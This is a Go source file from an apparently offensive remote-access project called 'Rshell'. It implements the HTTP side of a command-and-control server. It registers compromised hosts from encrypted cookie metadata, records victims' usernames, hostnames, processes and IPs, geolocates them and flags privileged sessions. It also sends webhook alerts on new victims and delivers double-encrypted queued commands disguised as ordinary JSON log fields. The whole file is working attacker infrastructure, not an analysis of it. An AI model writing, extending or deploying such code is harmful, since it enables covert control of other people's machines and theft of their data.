package communication

import (
	"Rshell/pkg/command"
	"Rshell/pkg/protocol"
	"Rshell/pkg/connection"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
)

// HTTPClient HTTP客户端结构
type HTTPClient struct {
	UID           string
	LastHeartbeat time.Time
	TimeoutCount  int32
	IsActive      atomic.Bool
	StopChan      chan struct{}
	SleepTime     int
	mu            sync.RWMutex
}

// HTTPClientManager HTTP客户端管理器
type HTTPClientManager struct {
	Clients map[string]*HTTPClient
	mu      sync.RWMutex
}

var (
	globalHTTPClientManager = &HTTPClientManager{
		Clients: make(map[string]*HTTPClient),
	}
)

// 安全分割OS信息函数
func safeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
	if osInfo == "" {
		return "Unknown", "Unknown", "Unknown"
	}

	parts := strings.SplitN(osInfo, "\t", 3)
	switch len(parts) {
	case 3:
		return parts[0], parts[1], parts[2]
	case 2:
		return parts[0], parts[1], "Unknown"
	case 1:
		return parts[0], "Unknown", "Unknown"
	default:
		return "Unknown", "Unknown", "Unknown"
	}
}

// Add 添加客户端
func (cm *HTTPClientManager) Add(uid string, sleepTime int) *HTTPClient {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	// 如果已存在，更新心跳时间
	if client, exists := cm.Clients[uid]; exists {
		client.mu.Lock()
		client.LastHeartbeat = time.Now()
		client.TimeoutCount = 0
		client.IsActive.Store(true)
		client.mu.Unlock()
		return client
	}

	// 创建新客户端
	client := &HTTPClient{
		UID:           uid,
		LastHeartbeat: time.Now(),
		TimeoutCount:  0,
		SleepTime:     sleepTime,
		StopChan:      make(chan struct{}),
	}
	client.IsActive.Store(true)

	cm.Clients[uid] = client

	// 启动心跳检查
	go client.startHeartbeatCheck()

	logger.Info("HTTP client added:", uid, "Total HTTP clients:", len(cm.Clients))
	return client
}

// Remove 移除客户端
func (cm *HTTPClientManager) Remove(uid string) {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	if client, exists := cm.Clients[uid]; exists {
		client.Stop()
		delete(cm.Clients, uid)
		logger.Info("HTTP client removed:", uid, "Total HTTP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *HTTPClientManager) Get(uid string) (*HTTPClient, bool) {
	cm.mu.RLock()
	defer cm.mu.RUnlock()

	client, exists := cm.Clients[uid]
	return client, exists
}

// UpdateHeartbeat 更新心跳
func (cm *HTTPClientManager) UpdateHeartbeat(uid string) {
	if client, exists := cm.Get(uid); exists {
		client.mu.Lock()
		client.LastHeartbeat = time.Now()
		atomic.StoreInt32(&client.TimeoutCount, 0)
		client.mu.Unlock()
	}
}

// Stop 停止客户端
func (c *HTTPClient) Stop() {
	if c.IsActive.CompareAndSwap(true, false) {
		close(c.StopChan)

		// 更新数据库状态
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("HTTP client marked as offline:", c.UID)
		}

		logger.Info("HTTP client stopped:", c.UID)
	}
}

// startHeartbeatCheck 启动心跳检查
func (c *HTTPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("HTTP heartbeat checker panic recovered:", r, "client:", c.UID)
		}
	}()

	ticker := time.NewTicker(time.Duration(c.SleepTime) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if !c.IsActive.Load() {
				return
			}

			c.mu.RLock()
			lastHeartbeat := c.LastHeartbeat
			c.mu.RUnlock()

			// 检查心跳是否超时
			if time.Since(lastHeartbeat) > time.Duration(c.SleepTime*2)*time.Second {
				newCount := atomic.AddInt32(&c.TimeoutCount, 1)

				if newCount >= 3 {
					logger.Info("HTTP client heartbeat timeout, marking as offline:", c.UID)

					// 从管理器移除
					globalHTTPClientManager.Remove(c.UID)

					// 从连接类型管理器移除
					connection.MuClientListenerType.Lock()
					delete(connection.ClientListenerType, c.UID)
					connection.MuClientListenerType.Unlock()

					return
				}
			}

		case <-c.StopChan:
			return
		}
	}
}

// GetHttp HTTP GET处理函数
func GetHttp(w http.ResponseWriter, r *http.Request) {
	// 记录请求开始时间
	startTime := time.Now()
	requestID := uuid.New().String()

	defer func() {
		if r := recover(); r != nil {
			logger.Error("HTTP GET handler panic recovered:", r, "RequestID:", requestID)
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Internal server error",
			})
		}

		// 记录请求处理时间
		logger.Debug("HTTP GET request completed:",
			"RequestID:", requestID,
			"Duration:", time.Since(startTime),
		)
	}()

	// 设置响应头
	w.Header().Set("Content-Type", "application/json")

	// 记录请求信息
	logger.Debug("HTTP GET request started:",
		"RequestID:", requestID,
		"RemoteAddr:", r.RemoteAddr,
		"UserAgent:", r.UserAgent(),
	)

	// 获取Cookie
	cookieValue := r.Header.Get("Cookie")
	if cookieValue == "" {
		logger.Warn("No cookie in request", "RequestID:", requestID)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Cookie required",
		})
		return
	}

	// 解析元数据
	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)
	if encryptMetainfo == cookieValue {
		logger.Warn("Invalid cookie format", "RequestID:", requestID)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid cookie format",
		})
		return
	}

	// 验证元数据长度
	if len(encryptMetainfo) == 0 {
		logger.Warn("Empty metadata", "RequestID:", requestID)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Empty metadata",
		})
		return
	}

	// 解码和解析元数据
	metainfo, uid, err := parseMetadata(encryptMetainfo)
	if err != nil {
		logger.Error("Failed to parse metadata:", err, "RequestID:", requestID)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Invalid metadata",
		})
		return
	}

	// 验证UID
	if len(uid) == 0 {
		logger.Error("Invalid UID generated", "RequestID:", requestID)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	// 检查客户端是否存在
	var clientRecord database.Clients
	exists, err := database.Engine.Where("uid = ?", uid).Get(&clientRecord)
	if err != nil {
		logger.Error("Database query failed:", err, "RequestID:", requestID)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Database error",
		})
		return
	}

	if !exists {
		// FirstBlood - 首次连接
		if err := handleFirstBlood(uid, metainfo, r); err != nil {
			logger.Error("First blood handling failed:", err, "RequestID:", requestID)
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Registration failed",
			})
			return
		}

		// 返回成功响应
		sendSuccessResponse(w, uid)
	} else {
		// PullCommands - 已有客户端
		if err := handlePullCommands(uid, &clientRecord, w); err != nil {
			logger.Error("Pull commands handling failed:", err, "RequestID:", requestID)
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Command processing failed",
			})
			return
		}
	}
}

// parseMetadata 解析元数据
func parseMetadata(encryptMetainfo string) ([]byte, string, error) {
	if len(encryptMetainfo) == 0 {
		return nil, "", fmt.Errorf("empty encryptMetainfo")
	}

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		return nil, "", fmt.Errorf("decode base64 failed: %w", err)
	}

	metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
	if err != nil {
		return nil, "", fmt.Errorf("decrypt failed: %w", err)
	}

	// 验证metainfo长度
	if len(metainfo) < 9 {
		return nil, "", fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
	}

	uid := encrypt.BytesToMD5(metainfo)
	return metainfo, uid, nil
}

// handleFirstBlood 处理首次连接
func handleFirstBlood(uid string, metainfo []byte, r *http.Request) error {
	// 验证metainfo长度
	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
	}

	// 设置连接类型
	connection.MuClientListenerType.Lock()
	connection.ClientListenerType[uid] = "web"
	connection.MuClientListenerType.Unlock()

	// 解析客户端信息
	clientInfo, err := parseClientInfo(metainfo, r)
	if err != nil {
		return fmt.Errorf("parse client info failed: %w", err)
	}

	// 开始事务
	session := database.Engine.NewSession()
	defer session.Close()

	if err := session.Begin(); err != nil {
		return fmt.Errorf("begin transaction failed: %w", err)
	}

	// 创建客户端记录
	client := &database.Clients{
		Uid:        uid,
		FirstStart: clientInfo.FirstStart,
		ExternalIP: clientInfo.ExternalIP,
		InternalIP: clientInfo.LocalIP,
		Username:   clientInfo.UserName,
		Computer:   clientInfo.HostName,
		Process:    clientInfo.ProcessName,
		Pid:        clientInfo.ProcessID,
		Address:    clientInfo.Address,
		Arch:       clientInfo.Arch,
		Note:       "",
		Sleep:      "5",
		Online:     "1",
		Color:      "",
		PublicKey:  clientInfo.PublicKey,
	}
	encrypt.PublicKeyMap[uid] = clientInfo.PublicKey

	// 插入记录
	if _, err := session.Insert(client); err != nil {
		session.Rollback()
		return fmt.Errorf("insert client failed: %w", err)
	}

	// 插入相关表
	if _, err := session.Insert(&database.Shell{Uid: uid, ShellContent: ""}); err != nil {
		session.Rollback()
		return fmt.Errorf("insert shell failed: %w", err)
	}

	if _, err := session.Insert(&database.Notes{Uid: uid, Note: ""}); err != nil {
		session.Rollback()
		return fmt.Errorf("insert notes failed: %w", err)
	}

	// 提交事务
	if err := session.Commit(); err != nil {
		return fmt.Errorf("commit transaction failed: %w", err)
	}

	// 发送Webhook通知
	go webhooks.NotifyOnline(*client)

	// 添加到客户端管理器
	globalHTTPClientManager.Add(uid, 5)

	logger.Info("New HTTP client registered:", uid, "IP:", clientInfo.ExternalIP)
	return nil
}

// ClientInfo 客户端信息结构
type ClientInfo struct {
	ProcessID   string
	UserName    string
	HostName    string
	ProcessName string
	LocalIP     string
	ExternalIP  string
	Address     string
	Arch        string
	FirstStart  string
	PublicKey   string
}

// parseClientInfo 解析客户端信息
func parseClientInfo(metainfo []byte, r *http.Request) (*ClientInfo, error) {
	if len(metainfo) < 9 {
		return nil, fmt.Errorf("metainfo too short: %d bytes", len(metainfo))
	}
	publicKey := metainfo[:32]
	metainfo = metainfo[32:]
	// 安全解析
	processID := binary.BigEndian.Uint32(metainfo[:4])
	flag := int(metainfo[4])

	// 验证是否有足够字节解析IP
	if len(metainfo) < 9 {
		return nil, fmt.Errorf("metainfo insufficient for IP parsing: %d bytes", len(metainfo))
	}

	ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
	localIP := utils.Uint32ToIP(ipInt).String()

	// 安全获取osInfo
	var osInfo string
	if len(metainfo) > 9 {
		osInfo = string(metainfo[9:])
	}

	// 使用安全分割函数
	hostName, userName, processName := safeSplitOSInfo(osInfo)

	// 获取外网IP
	externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		externalIp = r.RemoteAddr
	}
	if externalIp == "::1" {
		externalIp = "127.0.0.1"
	}

	// 验证IP地址
	if net.ParseIP(externalIp) == nil {
		logger.Warn("Invalid external IP:", externalIp)
		externalIp = "0.0.0.0"
	}

	// 获取地理位置
	address, _ := qqwry.GetLocationByIP(externalIp)

	// 格式化时间
	currentTime := time.Now()
	timeFormat := "01-02 15:04"
	formattedTime := currentTime.Format(timeFormat)

	// 判断架构
	arch := "x86"
	if flag > 8 {
		userName += "*"
		flag = flag - 8
	}
	if flag > 4 {
		arch = "x64"
	}

	return &ClientInfo{
		ProcessID:   strconv.Itoa(int(processID)),
		UserName:    userName,
		HostName:    hostName,
		ProcessName: processName,
		LocalIP:     localIP,
		ExternalIP:  externalIp,
		Address:     address,
		Arch:        arch,
		FirstStart:  formattedTime,
		PublicKey:   base64.StdEncoding.EncodeToString(publicKey[:]),
	}, nil
}

// handlePullCommands 处理命令拉取
func handlePullCommands(uid string, clientRecord *database.Clients, w http.ResponseWriter) error {
	// 更新在线状态
	if _, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"}); err != nil {
		return fmt.Errorf("update online status failed: %w", err)
	}

	// 更新心跳
	globalHTTPClientManager.UpdateHeartbeat(uid)

	// 获取命令
	var responseData map[string]interface{}
	cmdBytes, ok := command.CommandQueues.GetCommand(uid)

	if ok && len(cmdBytes) > 0 {
		// 验证命令长度
		//if len(cmdBytes) > 10*1024*1024 { // 10MB限制
		//	logger.Error("Command too large:", len(cmdBytes), "uid:", uid)
		//	cmdBytes = []byte("Error: Command too large")
		//}

		// 有命令需要执行
		cmdBytes, err := encrypt.Encrypt(cmdBytes, uid)
		if err != nil {
			return fmt.Errorf("encrypt command failed: %w", err)
		}

		cmdBytes, err = encrypt.Encrypt(cmdBytes, uid)
		if err != nil {
			return fmt.Errorf("second encrypt failed: %w", err)
		}

		cmdBase64, err := encrypt.EncodeBase64(cmdBytes)
		if err != nil {
			return fmt.Errorf("encode base64 failed: %w", err)
		}

		pos1, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		if err != nil {
			return fmt.Errorf("generate pos1 failed: %w", err)
		}

		pos3, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		if err != nil {
			return fmt.Errorf("generate pos3 failed: %w", err)
		}

		responseData = map[string]interface{}{
			"data": map[string]interface{}{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": map[string][]byte{
					"pos_1": pos1,
					"pos_2": cmdBase64,
					"pos_3": pos3,
				},
			},
		}
	} else {
		// 没有命令
		pos1, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		if err != nil {
			return fmt.Errorf("generate pos1 failed: %w", err)
		}

		pos3, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		if err != nil {
			return fmt.Errorf("generate pos3 failed: %w", err)
		}

		responseData = map[string]interface{}{
			"data": map[string]interface{}{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": map[string][]byte{
					"pos_1": pos1,
					"pos_2": []byte{},
					"pos_3": pos3,
				},
			},
		}
	}

	// 发送响应
	w.WriteHeader(http.StatusOK)
	if err := json.NewEncoder(w).Encode(responseData); err != nil {
		return fmt.Errorf("encode response failed: %w", err)
	}

	return nil
}

// sendSuccessResponse 发送成功响应
func sendSuccessResponse(w http.ResponseWriter, uid string) {
	successBytes, err := encrypt.Encrypt([]byte("success"), uid)
	if err != nil {
		logger.Error("Encrypt success message failed:", err)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	pos1, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
	if err != nil {
		logger.Error("Generate pos1 failed:", err)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	pos2, err := encrypt.EncodeBase64(successBytes)
	if err != nil {
		logger.Error("Generate pos2 failed:", err)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	pos3, err := encrypt.EncodeBase64(encrypt.GenRandomBytes())
	if err != nil {
		logger.Error("Generate pos3 failed:", err)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Internal server error",
		})
		return
	}

	response := map[string]interface{}{
		"data": map[string]interface{}{
			"log_id": encrypt.GenRandomLogID(),
			"action_rule": map[string][]byte{
				"pos_1": pos1,
				"pos_2": pos2,
				"pos_3": pos3,
			},
		},
	}

	w.WriteHeader(http.StatusOK)
	if err := json.NewEncoder(w).Encode(response); err != nil {
		logger.Error("Encode response failed:", err)
	}
}

// CleanupHTTP 清理HTTP客户端
func CleanupHTTP() {
	logger.Info("Starting HTTP client cleanup...")

	globalHTTPClientManager.mu.Lock()
	defer globalHTTPClientManager.mu.Unlock()

	for uid, client := range globalHTTPClientManager.Clients {
		client.Stop()
		delete(globalHTTPClientManager.Clients, uid)
	}

	logger.Info("HTTP client cleanup completed")
}

// GetHTTPStats 获取HTTP统计信息
func GetHTTPStats() map[string]interface{} {
	globalHTTPClientManager.mu.RLock()
	defer globalHTTPClientManager.mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_http_clients"] = len(globalHTTPClientManager.Clients)

	activeCount := 0
	for _, client := range globalHTTPClientManager.Clients {
		if client.IsActive.Load() {
			activeCount++
		}
	}
	stats["active_http_clients"] = activeCount

	return stats
}
